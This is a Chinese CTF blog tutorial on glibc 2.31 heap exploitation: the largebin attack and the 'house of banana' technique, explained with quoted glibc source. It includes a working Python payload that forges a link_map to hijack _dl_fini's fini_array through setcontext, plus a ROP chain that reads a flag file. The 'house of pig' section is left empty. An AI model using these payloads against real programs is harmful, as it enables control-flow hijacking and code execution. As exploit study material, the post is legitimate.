---
title: glibc2.31下largebin攻击
date: 2021-10-21 18:46:56
tags: ['信息安全', 'ctf']
categories: ['ctf']
---


# 前言

  之前打天翼杯线下的时候，遇到了一道pwn题完全没思路，查资料的过程中发现，好家伙，怎么House of系列攻击有更新了这么多类别，细看发现大多是largebin attack相关的。因此特别整理了一期博客进行学习

# 源代码

  实际上largebin attack的原理十分简单，就是检查不严格，其漏洞代码如下所示
  ```c
/* malloc/malloc.c:  */

              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
		/* 后面代码部分省略
```

  
  这是在**malloc**过程中，将**unsorted bin**的chunk卸下部分的代码，如果卸下的chunk大小位于**largebin**，并且是该bin中大小最小的，则会执行这部分代码。如果我们可以控制**bck->fd_nextsize**字段值，则可以在任意地址处写入一个**largebin**的地址


# 利用思路

  当然，**largebin attack**的作用仅仅是向一个任意地址写一个**largebin**地址。因此其一定需要配合其他方法，从而一起完成一次攻击，目前主要的有**house of banana**和**house of pig**



## house of pig

### 攻击姿势

  **house of pig**涉及到了**FILE结构利用**和**largebin attack**

#### FILE结构利用

  
### 样例:ty_peak



## house of banana

### 攻击原理

  **house of banana**主要通过更改**_rtld_global**结构，从而劫持了**_dl_fini**。当程序**exit**或正常退出**main**函数时，则会执行到伪造的**fini_array**数组。一般可以配合**setcontext**函数，从而完成相关的rop构建

  **_rtld_global**符号是**rtld_global**类型的，其定义如下所示
  ```c
/* sysdeps/generic/ldsodefs.h */

#ifndef SHARED
# define EXTERN extern
# define GL(name) _##name
#else
# define EXTERN
# if IS_IN (rtld)
#  define GL(name) _rtld_local._##name
# else
#  define GL(name) _rtld_global._##name
# endif
struct rtld_global
{
#endif
  /* Don't change the order of the following elements.  'dl_loaded'
     must remain the first element.  Forever.  */

/* Non-shared code has no support for multiple namespaces.  */
#ifdef SHARED
# define DL_NNS 16
#else
# define DL_NNS 1
#endif
  EXTERN struct link_namespaces
  {
    /* A pointer to the map for the main map.  */
    struct link_map *_ns_loaded;
    /* Number of object in the _dl_loaded list.  */
    unsigned int _ns_nloaded;
    /* Direct pointer to the searchlist of the main object.  */
    struct r_scope_elem *_ns_main_searchlist;
    /* This is zero at program start to signal that the global scope map is
       allocated by rtld.  Later it keeps the size of the map.  It might be
       reset if in _dl_close if the last global object is removed.  */
    unsigned int _ns_global_scope_alloc;

    /* During dlopen, this is the number of objects that still need to
       be added to the global scope map.  It has to be taken into
       account when resizing the map, for future map additions after
       recursive dlopen calls from ELF constructors.  */
    unsigned int _ns_global_scope_pending_adds;

    /* Search table for unique objects.  */
    struct unique_sym_table
    {
      __rtld_lock_define_recursive (, lock)
      struct unique_sym
      {
	uint32_t hashval;
	const char *name;
	const ElfW(Sym) *sym;
	const struct link_map *map;
      } *entries;
      size_t size;
      size_t n_elements;
      void (*free) (void *);
    } _ns_unique_sym_table;
    /* Keep track of changes to each namespace' list.  */
    struct r_debug _ns_debug;
  } _dl_ns[DL_NNS];
  /* One higher than index of last used namespace.  */
  EXTERN size_t _dl_nns;

  /* During the program run we must not modify the global data of
     loaded shared object simultanously in two threads.  Therefore we
     protect `_dl_open' and `_dl_close' in dl-close.c.

     This must be a recursive lock since the initializer function of
     the loaded object might as well require a call to this function.
     At this time it is not anymore a problem to modify the tables.  */
  __rtld_lock_define_recursive (EXTERN, _dl_load_lock)
  /* This lock is used to keep __dl_iterate_phdr from inspecting the
     list of loaded objects while an object is added to or removed
     from that list.  */
  __rtld_lock_define_recursive (EXTERN, _dl_load_write_lock)

  /* Incremented whenever something may have been added to dl_loaded.  */
  EXTERN unsigned long long _dl_load_adds;

  /* The object to be initialized first.  */
  EXTERN struct link_map *_dl_initfirst;

  /* Map of shared object to be profiled.  */
  EXTERN struct link_map *_dl_profile_map;

  /* Counters for the number of relocations performed.  */
  EXTERN unsigned long int _dl_num_relocations;
  EXTERN unsigned long int _dl_num_cache_relocations;

  /* List of search directories.  */
  EXTERN struct r_search_path_elem *_dl_all_dirs;

  /* Structure describing the dynamic linker itself.  */
  EXTERN struct link_map _dl_rtld_map;
#ifdef SHARED
  /* Used to store the audit information for the link map of the
     dynamic loader.  */
  struct auditstate _dl_rtld_auditstate[DL_NNS];
#endif

#if defined SHARED && defined _LIBC_REENTRANT \
    && defined __rtld_lock_default_lock_recursive
  EXTERN void (*_dl_rtld_lock_recursive) (void *);
  EXTERN void (*_dl_rtld_unlock_recursive) (void *);
#endif

  /* Get architecture specific definitions.  */
#define PROCINFO_DECL
#ifndef PROCINFO_CLASS
# define PROCINFO_CLASS EXTERN
#endif
#include <dl-procruntime.c>

  /* If loading a shared object requires that we make the stack executable
     when it was not, we do it by calling this function.
     It returns an errno code or zero on success.  */
  EXTERN int (*_dl_make_stack_executable_hook) (void **);

  /* Prevailing state of the stack, PF_X indicating it's executable.  */
  EXTERN ElfW(Word) _dl_stack_flags;

  /* Flag signalling whether there are gaps in the module ID allocation.  */
  EXTERN bool _dl_tls_dtv_gaps;
  /* Highest dtv index currently needed.  */
  EXTERN size_t _dl_tls_max_dtv_idx;
  /* Information about the dtv slots.  */
  EXTERN struct dtv_slotinfo_list
  {
    size_t len;
    struct dtv_slotinfo_list *next;
    struct dtv_slotinfo
    {
      size_t gen;
      struct link_map *map;
    } slotinfo[];
  } *_dl_tls_dtv_slotinfo_list;
  /* Number of modules in the static TLS block.  */
  EXTERN size_t _dl_tls_static_nelem;
  /* Size of the static TLS block.  */
  EXTERN size_t _dl_tls_static_size;
  /* Size actually allocated in the static TLS block.  */
  EXTERN size_t _dl_tls_static_used;
  /* Alignment requirement of the static TLS block.  */
  EXTERN size_t _dl_tls_static_align;

/* Number of additional entries in the slotinfo array of each slotinfo
   list element.  A large number makes it almost certain take we never
   have to iterate beyond the first element in the slotinfo list.  */
#define TLS_SLOTINFO_SURPLUS (62)

/* Number of additional slots in the dtv allocated.  */
#define DTV_SURPLUS	(14)

  /* Initial dtv of the main thread, not allocated with normal malloc.  */
  EXTERN void *_dl_initial_dtv;
  /* Generation counter for the dtv.  */
  EXTERN size_t _dl_tls_generation;

  EXTERN void (*_dl_init_static_tls) (struct link_map *);

  EXTERN void (*_dl_wait_lookup_done) (void);

  /* Scopes to free after next THREAD_GSCOPE_WAIT ().  */
  EXTERN struct dl_scope_free_list
  {
    size_t count;
    void *list[50];
  } *_dl_scope_free_list;
#if !THREAD_GSCOPE_IN_TCB
  EXTERN int _dl_thread_gscope_count;
#endif
#ifdef SHARED
};
# define __rtld_global_attribute__
# if IS_IN (rtld)
#  ifdef HAVE_SDATA_SECTION
#   define __rtld_local_attribute__ \
	    __attribute__ ((visibility ("hidden"), section (".sdata")))
#   undef __rtld_global_attribute__
#   define __rtld_global_attribute__ __attribute__ ((section (".sdata")))
#  else
#   define __rtld_local_attribute__ __attribute__ ((visibility ("hidden")))
#  endif
extern struct rtld_global _rtld_local __rtld_local_attribute__;
#  undef __rtld_local_attribute__
# endif
extern struct rtld_global _rtld_global __rtld_global_attribute__;
# undef __rtld_global_attribute__
#endif
```

  这里多提一嘴，**_rtld_global**的**_dl_rtld_lock_recursive**和**_dl_rtld_unlock_recursive**字段可以理解为**exit**的hook。
  说回正题，可以看到，**rtld_global**中包含**_dl_ns**数组，与elf文件的各个段的符号相关，其中也自然包括了**fini_array**段，而**fini_array**在**_dl_fini**中被调用，相关源代码如下所示
  ```C
void
_dl_fini (void)
{
  /* Lots of fun ahead.  We have to call the destructors for all still
     loaded objects, in all namespaces.  The problem is that the ELF
     specification now demands that dependencies between the modules
     are taken into account.  I.e., the destructor for a module is
     called before the ones for any of its dependencies.

     To make things more complicated, we cannot simply use the reverse
     order of the constructors.  Since the user might have loaded objects
     using `dlopen' there are possibly several other modules with its
     dependencies to be taken into account.  Therefore we have to start
     determining the order of the modules once again from the beginning.  */

  /* We run the destructors of the main namespaces last.  As for the
     other namespaces, we pick run the destructors in them in reverse
     order of the namespace ID.  */
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
	  || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
	  )
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
      else
	{
	  /* Now we can allocate an array to hold all the pointers and
	     copy the pointers in.  */
	  struct link_map *maps[nloaded];

	  unsigned int i;
	  struct link_map *l;
	  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
	  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
	    /* Do not handle ld.so in secondary namespaces.  */
	    if (l == l->l_real)
	      {
		assert (i < nloaded);

		maps[i] = l;
		l->l_idx = i;
		++i;

		/* Bump l_direct_opencount of all objects so that they
		   are not dlclose()ed from underneath us.  */
		++l->l_direct_opencount;
	      }
	  assert (ns != LM_ID_BASE || i == nloaded);
	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
	  unsigned int nmaps = i;

	  /* Now we have to do the sorting.  We can skip looking for the
	     binary itself which is at the front of the search list for
	     the main namespace.  */
	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),
			 NULL, true);

	  /* We do not rely on the linked list of loaded object anymore
	     from this point on.  We have our own list here (maps).  The
	     various members of this list cannot vanish since the open
	     count is too high and will be decremented in this loop.  So
	     we release the lock so that some code which might be called
	     from a destructor can directly or indirectly access the
	     lock.  */
	  __rtld_lock_unlock_recursive (GL(dl_load_lock));

	  /* 'maps' now contains the objects in the right order.  Now
	     call the destructors.  We have to process this array from
	     the front.  */
	  for (i = 0; i < nmaps; ++i)
	    {
	      struct link_map *l = maps[i];

	      if (l->l_init_called)
		{
		  /* Make sure nothing happens if we are called twice.  */
		  l->l_init_called = 0;

		  /* Is there a destructor function?  */
		  if (l->l_info[DT_FINI_ARRAY] != NULL
		      || l->l_info[DT_FINI] != NULL)
		    {

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}

		      /* Next try the old-style destructor.  */
		      if (l->l_info[DT_FINI] != NULL)
			DL_CALL_DT_FINI
			  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
		    }

#ifdef SHARED
		  /* Auditing checkpoint: another object closed.  */
		  if (!do_audit && __builtin_expect (GLRO(dl_naudit) > 0, 0))
		    {
		      struct audit_ifaces *afct = GLRO(dl_audit);
		      for (unsigned int cnt = 0; cnt < GLRO(dl_naudit); ++cnt)
			{
			  if (afct->objclose != NULL)
			    {
			      struct auditstate *state
				= link_map_audit_state (l, cnt);
			      /* Return value is ignored.  */
			      (void) afct->objclose (&state->cookie);
			    }
			  afct = afct->next;
			}
		    }
#endif
		}

	      /* Correct the previous increment.  */
	      --l->l_direct_opencount;
	    }
	}
    }

#ifdef SHARED
  if (! do_audit && GLRO(dl_naudit) > 0)
    {
      do_audit = 1;
      goto again;
    }

  if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_STATISTICS))
    _dl_debug_printf ("\nruntime linker statistics:\n"
		      "           final number of relocations: %lu\n"
		      "final number of relocations from cache: %lu\n",
		      GL(dl_num_relocations),
		      GL(dl_num_cache_relocations));
#endif
}
```

  根据**_dl_fini**逻辑，我们可以发现，**_dl_ns**数组元素的每一个**_ns_loaded**字段都是**link_map**类型的。而对于**link_map**类型的变量**l**，其**l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr**是一个元素个数为**l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr))**的**fini_array**函数指针数组。
  因此，只要我们可以修改任意一个**_dl_ns**数组元素的**_ns_loaded**字段的**l_addr**、**l_info**字段的值，即可劫持执行流

  另一方面，**glibc2.31**下一般**one_gadget**都不太行，其约束条件过多。因此一般通过**setcontext**函数，从而转移栈结构，执行提前构造好的rop。而在**_dl_fini**函数中，当其执行**fini_array**函数指针数组中的倒数第二个函数指针时，其**rdx**的值恰好为fini_array数组最后一个元素的地址，也就是通过**setcontext**函数转移的目标栈恰好位于我们可以控制的内存区域，则可以完成rop的执行。

### 攻击姿势

  在给出最终的攻击姿势之前，需要特别提醒几点
  1. 虽然**_rtld_global**与**glibc**的基址是固定偏移，但是不同机器上该偏移可能低第二个字节不一样(开启gdb和未开启gdb可能也不一样)。因此gdb调通后，只需要爆破第二个字节即可
  2. 在glibc2.31后，**setcontext**函数的转移寄存器更改为了**rdx**。如果不同glibc版本可能不一样
  3. 下面给出的相关偏移都是在glibc2.31下的，不同版本的偏移(比如调用**fini_array**时rdx的相对偏移等)需要具体去更改
  4. **house of banana**的一定需要程序正常退出main；或者显式调用**exit(即其会调用__run_exit_handlers;不能是包装_exit的exit)**退出。如果因为异常退出，则不会执行**fini_array**中的函数指针数组
  5. 在glibc2.31条件下，通过gdb调试时，可以设置**break *(ld_base + 0x11f58)**，查看调用**fini_array**



  首先，我们需要使用**largebin attack**，从而将一个堆地址覆盖到**`_rtld_global->_dl_ns[0]->_ns_loaded**，只需要将一个处于**largebin**的chunk的前**SIZE_SZ * 6**覆盖成如下值即可
  ```python
up64(pre_size) + up64(size | 1) + up64(fd) + up64(bk) + up64(fd_nextsize) + up64(_rtld_global - 0x20)
  ```
  然后在释放一个chunk大小小于**size**的、但和chunk处于同一个**largebin**的**fake_link_map**到**largebin**中，则成功将覆盖了**_rtld_global->_dl_ns[0]->_ns_loaded**的指针值


  下面则是伪造**link_map**结构，从而劫持**fini_array**即可，相关的源代码如下所示
  ```c
/* 定义在 elf/elf.h:878 */
#define	DT_FINI_ARRAY	26		/* Array with addresses of fini fct */
#define	DT_FINI_ARRAYSZ	28		/* Size in bytes of DT_FINI_ARRAY */

/* 定义在 include/link.h: 82 */
/* Structure describing a loaded shared object.  The `l_next' and `l_prev'
   members form a chain of all the shared objects loaded at startup.

   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.

   This data structure might change in future, if necessary.  User-level
   programs must avoid defining objects of this type.  */

struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */

    /* All following members are internal to the dynamic linker.
       They may change without notice.  */

    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;

    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;

    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr;	/* Pointer to program header table in core.  */
    ElfW(Addr) l_entry;		/* Entry point location.  */
    ElfW(Half) l_phnum;		/* Number of program header entries.  */
    ElfW(Half) l_ldnum;		/* Number of dynamic segment entries.  */

    /* Array of DT_NEEDED dependencies and their dependencies, in
       dependency order for symbol lookup (with and without
       duplicates).  There is no entry before the dependencies have
       been loaded.  */
    struct r_scope_elem l_searchlist;

    /* We need a special searchlist to process objects marked with
       DT_SYMBOLIC.  */
    struct r_scope_elem l_symbolic_searchlist;

    /* Dependent object that first caused this object to be loaded.  */
    struct link_map *l_loader;

    /* Array with version names.  */
    struct r_found_version *l_versions;
    unsigned int l_nversions;

    /* Symbol hash table.  */
    Elf_Symndx l_nbuckets;
    Elf32_Word l_gnu_bitmask_idxbits;
    Elf32_Word l_gnu_shift;
    const ElfW(Addr) *l_gnu_bitmask;
    union
    {
      const Elf32_Word *l_gnu_buckets;
      const Elf_Symndx *l_chain;
    };
    union
    {
      const Elf32_Word *l_gnu_chain_zero;
      const Elf_Symndx *l_buckets;
    };

    unsigned int l_direct_opencount; /* Reference count for dlopen/dlclose.  */
    enum			/* Where this object came from.  */
      {
	lt_executable,		/* The main executable program.  */
	lt_library,		/* Library needed by main executable.  */
	lt_loaded		/* Extra run-time loaded shared object.  */
      } l_type:2;
    unsigned int l_relocated:1;	/* Nonzero if object's relocations done.  */
    unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */
    unsigned int l_global:1;	/* Nonzero if object in _dl_global_scope.  */
    unsigned int l_reserved:2;	/* Reserved for internal use.  */
    unsigned int l_phdr_allocated:1; /* Nonzero if the data structure pointed
					to by `l_phdr' is allocated.  */
    unsigned int l_soname_added:1; /* Nonzero if the SONAME is for sure in
				      the l_libname list.  */
    unsigned int l_faked:1;	/* Nonzero if this is a faked descriptor
				   without associated file.  */
    unsigned int l_need_tls_init:1; /* Nonzero if GL(dl_init_static_tls)
				       should be called on this link map
				       when relocation finishes.  */
    unsigned int l_auditing:1;	/* Nonzero if the DSO is used in auditing.  */
    unsigned int l_audit_any_plt:1; /* Nonzero if at least one audit module
				       is interested in the PLT interception.*/
    unsigned int l_removed:1;	/* Nozero if the object cannot be used anymore
				   since it is removed.  */
    unsigned int l_contiguous:1; /* Nonzero if inter-segment holes are
				    mprotected or if no holes are present at
				    all.  */
    unsigned int l_symbolic_in_local_scope:1; /* Nonzero if l_local_scope
						 during LD_TRACE_PRELINKING=1
						 contains any DT_SYMBOLIC
						 libraries.  */
    unsigned int l_free_initfini:1; /* Nonzero if l_initfini can be
				       freed, ie. not allocated with
				       the dummy malloc in ld.so.  */

    /* NODELETE status of the map.  Only valid for maps of type
       lt_loaded.  Lazy binding sets l_nodelete_active directly,
       potentially from signal handlers.  Initial loading of an
       DF_1_NODELETE object set l_nodelete_pending.  Relocation may
       set l_nodelete_pending as well.  l_nodelete_pending maps are
       promoted to l_nodelete_active status in the final stages of
       dlopen, prior to calling ELF constructors.  dlclose only
       refuses to unload l_nodelete_active maps, the pending status is
       ignored.  */
    bool l_nodelete_active;
    bool l_nodelete_pending;

#include <link_map.h>

    /* Collected information about own RPATH directories.  */
    struct r_search_path_struct l_rpath_dirs;

    /* Collected results of relocation while profiling.  */
    struct reloc_result
    {
      DL_FIXUP_VALUE_TYPE addr;
      struct link_map *bound;
      unsigned int boundndx;
      uint32_t enterexit;
      unsigned int flags;
      /* CONCURRENCY NOTE: This is used to guard the concurrent initialization
	 of the relocation result across multiple threads.  See the more
	 detailed notes in elf/dl-runtime.c.  */
      unsigned int init;
    } *l_reloc_result;

    /* Pointer to the version information if available.  */
    ElfW(Versym) *l_versyms;

    /* String specifying the path where this object was found.  */
    const char *l_origin;

    /* Start and finish of memory map for this object.  l_map_start
       need not be the same as l_addr.  */
    ElfW(Addr) l_map_start, l_map_end;
    /* End of the executable part of the mapping.  */
    ElfW(Addr) l_text_end;

    /* Default array for 'l_scope'.  */
    struct r_scope_elem *l_scope_mem[4];
    /* Size of array allocated for 'l_scope'.  */
    size_t l_scope_max;
    /* This is an array defining the lookup scope for this link map.
       There are initially at most three different scope lists.  */
    struct r_scope_elem **l_scope;

    /* A similar array, this time only with the local scope.  This is
       used occasionally.  */
    struct r_scope_elem *l_local_scope[2];

    /* This information is kept to check for sure whether a shared
       object is the same as one already loaded.  */
    struct r_file_id l_file_id;

    /* Collected information about own RUNPATH directories.  */
    struct r_search_path_struct l_runpath_dirs;

    /* List of object in order of the init and fini calls.  */
    struct link_map **l_initfini;

    /* List of the dependencies introduced through symbol binding.  */
    struct link_map_reldeps
      {
	unsigned int act;
	struct link_map *list[];
      } *l_reldeps;
    unsigned int l_reldepsmax;

    /* Nonzero if the DSO is used.  */
    unsigned int l_used;

    /* Various flag words.  */
    ElfW(Word) l_feature_1;
    ElfW(Word) l_flags_1;
    ElfW(Word) l_flags;

    /* Temporarily used in `dl_close'.  */
    int l_idx;

    struct link_map_machine l_mach;

    struct
    {
      const ElfW(Sym) *sym;
      int type_class;
      struct link_map *value;
      const ElfW(Sym) *ret;
    } l_lookup_cache;

    /* Thread-local storage related info.  */

    /* Start of the initialization image.  */
    void *l_tls_initimage;
    /* Size of the initialization image.  */
    size_t l_tls_initimage_size;
    /* Size of the TLS block.  */
    size_t l_tls_blocksize;
    /* Alignment requirement of the TLS block.  */
    size_t l_tls_align;
    /* Offset of first byte module alignment.  */
    size_t l_tls_firstbyte_offset;
#ifndef NO_TLS_OFFSET
# define NO_TLS_OFFSET	0
#endif
#ifndef FORCED_DYNAMIC_TLS_OFFSET
# if NO_TLS_OFFSET == 0
#  define FORCED_DYNAMIC_TLS_OFFSET -1
# elif NO_TLS_OFFSET == -1
#  define FORCED_DYNAMIC_TLS_OFFSET -2
# else
#  error "FORCED_DYNAMIC_TLS_OFFSET is not defined"
# endif
#endif
    /* For objects present at startup time: offset in the static TLS block.  */
    ptrdiff_t l_tls_offset;
    /* Index of the module in the dtv array.  */
    size_t l_tls_modid;

    /* Number of thread_local objects constructed by this DSO.  This is
       atomically accessed and modified and is not always protected by the load
       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */
    size_t l_tls_dtor_count;

    /* Information used to change permission after the relocations are
       done.  */
    ElfW(Addr) l_relro_addr;
    size_t l_relro_size;

    unsigned long long int l_serial;
  };
```

  那么，结合上述定义，我们很容易伪造一个包含有orw的rop的**link_map**，如下所示
  ```python
	#house of banana
	fake_link_map_addr = chunk_base + 0x000055de23bed370 - 0x55de23bec000
	flag_address = fake_link_map_addr + 100 * 8
	stack_address = fake_link_map_addr + 0x10
	pop_rdi_ret = lib_base + 0x26b72
	ret = pop_rdi_ret + 1
	pop_rsi_ret = lib_base + 0x27529
	pop_rdx_r12_ret = lib_base + 0x11c36f
	syscall_ret = lib_base + 0x66229
	rop = ''
	rop += up64(pop_rdi_ret) + up64(flag_address)
	rop += up64(pop_rsi_ret) + up64(4)
	rop += up64(lib_base + lib.sym['open'])
	rop += up64(pop_rdi_ret) + up64(3)
	rop += up64(pop_rsi_ret) + up64(flag_address)
	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
	rop += up64(lib_base + lib.sym['read'])
	rop += up64(pop_rdi_ret) + up64(1)
	rop += up64(pop_rsi_ret) + up64(flag_address)
	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
	rop += up64(lib_base + lib.sym['write'])
	rop += up64(lib_base + lib.sym['exit'])
	'''
	link_map {
		l_addr = 0							offset: 0 * 8

		l_next = (char*)fake_link_map_addr + 7 * 8 - 3 * 8		offset: 3 * 8

		l_real = &link_map						offset: 5 * 8

		fake_l_next_2:							offset: 7 * 8
			(char*)fake_link_map_addr + 8 * 8 - 3 * 8
		fake_l_next_3:							offset: 8 * 8
			(char*)fake_link_map_addr + 13 * 8 - 3 * 8
		fake_l_real_2:							offset: 9 * 8
			(char*)fake_link_map_addr + 7 * 8 - 3 * 8
		fake_l_real_3:							offset: 10 * 8
			(char*)fake_link_map_addr + 8 * 8 - 3 * 8

		fake_l_next_4:							offset: 13 * 8
			null

		fake_l_real_4:							offset: 15 * 8
			(char*)fake_link_map_addr + 13 * 8 - 3 * 8

		l_info[26]							offset: 34 * 8
			(char*)&link_map + 37 * 8

		l_info[28]							offset: 36 * 8
			(char*)&link_map + 39 * 8

		fini_array:							offset: 38 * 8
			(char*)&link_map + 52 * 8

		fini_arraysize:							offset: 40 * 8
			8 * 2
	
		fini_array:							offset: 52 * 8
			lib_base + lib.sym['setcontext'] + 61
			lib_base + ret
		
		setcontext_rdi:							offset: 66 * 8
			0
		setcontext_rsi:							offset: 67 * 8
			stack_address

		setcontext_rdx:							offset: 70 * 8
			len(rop)

		setcontext_stack:						offset: 73 * 8
			stack_address
		setcontext_retn:						offset: 74 * 8
			lib_base + lib.sym['read']
			
		
		l_init_called = 0x800000000					offset: 99 * 8
		flag:								offset: 100 * 8
			'flag\x00'
	}
	'''
	fake_link_map = ''
	fake_link_map = fake_link_map.ljust(3 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#l_next
	fake_link_map = fake_link_map.ljust(5 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr)					#l_real
	fake_link_map = fake_link_map.ljust(7 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_next_2
	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_next_3
	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#fake_l_real_2
	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_real_3
	fake_link_map = fake_link_map.ljust(13 * 8, '\x00')
	fake_link_map += up64(0)							#fake_l_next_4
	fake_link_map = fake_link_map.ljust(15 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_real_4
	fake_link_map = fake_link_map.ljust(34 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 37 * 8)				#l_info[26]
	fake_link_map = fake_link_map.ljust(36 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 39 * 8)				#l_info[26]
	fake_link_map = fake_link_map.ljust(38 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 52 * 8)				#fini_array
	fake_link_map = fake_link_map.ljust(40 * 8, '\x00')
	fake_link_map += up64(8 * 2)							#fini_arraysize
	fake_link_map = fake_link_map.ljust(52 * 8, '\x00')
	fake_link_map += up64(lib_base + lib.sym['setcontext'] + 61) + up64(ret)	#fini_array
	fake_link_map = fake_link_map.ljust(66 * 8, '\x00')
	fake_link_map += up64(0)							#setcontext_rdi
	fake_link_map += up64(stack_address)						#setcontext_rsi
	fake_link_map = fake_link_map.ljust(70 * 8, '\x00')
	fake_link_map += up64(len(rop))							#setcontext_rdx
	fake_link_map = fake_link_map.ljust(73 * 8, '\x00')
	fake_link_map += up64(stack_address)						#setcontext_stack
	fake_link_map += up64(lib_base + lib.sym['read'])				#setcontext_retn
	fake_link_map = fake_link_map.ljust(99 * 8, '\x00')
	fake_link_map += up64(0x800000000)						#l_init_called
	fake_link_map += 'flag\x00'							#flag
```

  这里最后给出**setcontext**方便使用的部分指令，其他攻击中也会进行使用，如下所示
  ```c
00000000000580a0 <setcontext@@GLIBC_2.2.5>:
..............................................................
   580dd:	48 8b a2 a0 00 00 00 	mov    0xa0(%rdx),%rsp
   580e4:	48 8b 9a 80 00 00 00 	mov    0x80(%rdx),%rbx
   580eb:	48 8b 6a 78          	mov    0x78(%rdx),%rbp
   580ef:	4c 8b 62 48          	mov    0x48(%rdx),%r12
   580f3:	4c 8b 6a 50          	mov    0x50(%rdx),%r13
   580f7:	4c 8b 72 58          	mov    0x58(%rdx),%r14 580fb:	4c 8b 7a 60          	mov    0x60(%rdx),%r15
   580ff:	64 f7 04 25 48 00 00 	testl  $0x2,%fs:0x48
   58106:	00 02 00 00 00 
   5810b:	0f 84 b5 00 00 00    	je     581c6 <setcontext@@GLIBC_2.2.5+0x126>
..............................................................
   581c6:	48 8b 8a a8 00 00 00 	mov    0xa8(%rdx),%rcx
   581cd:	51                   	push   %rcx
   581ce:	48 8b 72 70          	mov    0x70(%rdx),%rsi
   581d2:	48 8b 7a 68          	mov    0x68(%rdx),%rdi
   581d6:	48 8b 8a 98 00 00 00 	mov    0x98(%rdx),%rcx
   581dd:	4c 8b 42 28          	mov    0x28(%rdx),%r8
   581e1:	4c 8b 4a 30          	mov    0x30(%rdx),%r9
   581e5:	48 8b 92 88 00 00 00 	mov    0x88(%rdx),%rdx
   581ec:	31 c0                	xor    %eax,%eax
   581ee:	c3                   	retq   
